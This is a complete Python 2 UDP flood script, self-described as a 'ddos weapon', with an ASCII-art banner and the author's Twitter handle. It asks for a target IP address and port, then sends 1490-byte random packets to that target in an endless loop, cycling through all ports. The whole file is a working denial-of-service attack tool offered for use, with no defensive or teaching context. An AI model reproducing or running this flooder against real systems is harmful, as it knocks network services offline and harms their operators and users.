#!/usr/bin/python
# -*- coding: latin-1 -*-
#Tool for UDP Flood
#Authorized by gamm3r96
import socket, os, random, time

# Color
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

# Code time ##################
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############################

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
logo = B + '''


███████╗██╗      ██████╗  ██████╗ ██████╗ 
██╔════╝██║     ██╔═████╗██╔═████╗██╔══██╗
█████╗  ██║     ██║██╔██║██║██╔██║██║  ██║
██╔══╝  ██║     ████╔╝██║████╔╝██║██║  ██║
██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
                                          
'''
print (logo)
print "["+B+""+R+"#"+N+"] "+B+""+R+"follow me on twitter @gamm3r96"+N+"   Fl00d "+B+""+R+"ddos weapon"+N
print
print "#From 254,,,with love"
print ""
ip = raw_input('[$] T@rget 1P: ')
port = input('[$] P0rt: ')
os.system("clear")
print "Fl00d attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
time.sleep(3)
print
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
